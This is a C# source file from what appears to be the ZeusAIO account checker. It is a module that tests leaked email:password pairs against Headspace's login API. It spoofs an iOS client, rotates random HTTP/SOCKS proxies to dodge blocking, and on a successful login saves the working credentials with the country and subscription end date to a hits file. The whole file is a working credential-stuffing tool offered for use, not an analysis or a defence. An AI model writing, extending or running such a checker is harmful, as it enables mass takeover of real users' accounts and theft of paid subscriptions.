using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;

namespace Headspace_UK
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest req = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                req.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                req.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                req.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            req.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(req.SslCertificateValidatorCallback,
                              new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            req.IgnoreProtocolErrors = true;
                            req.KeepAlive = true;
                            req.AllowAutoRedirect = true;

                            req.UserAgent = "Headspace/41387 CFNetwork/1098.7 Darwin/19.0.0";
                            req.AddHeader("Accept", "*/*");
                            req.AddHeader("hs-client-platform", "iOS");
                            string res = req.Post("https://api.prod.headspace.com/auth/tokens/email", string.Concat(new string[]
                            {
                                "{\"password\":\"",
                                s[1],
                                "\",\"platform\":\"IOS\",\"email\":\"",
                                s[0],
                                "\"}"
                            }), "application/json").ToString();
                            if (res.Contains("Either your email or password was incorrect"))
                            {
                                break;
                            }
                            else if (res.Contains("countryCode"))
                            {
                                string text5 = Parse(res, "countryCode\":\"", "\",\"");
                                string text6 = Parse(res, "endDate\":\"", "\",\"status");
                                ZeusAIO.mainmenu.hits++;
                                if (Config.config.LogorCui == "2")
                                {
                                    Console.WriteLine("[HIT - HEADSPACEUK] " + s[0] + ":" + s[1] + " | Country Code: " + text5 + " | EndDate: " + text6, Color.Green);
                                }
                                Export.AsResult("/HeadspaceUK_hits", s[0] + ":" + s[1] + " | Country Code: " + text5 + " | EndDate: " + text6);
                                return false;
                            }
                            else
                            {
                                ZeusAIO.mainmenu.realretries++;
                                goto Retry;
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }
        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }
    }
}

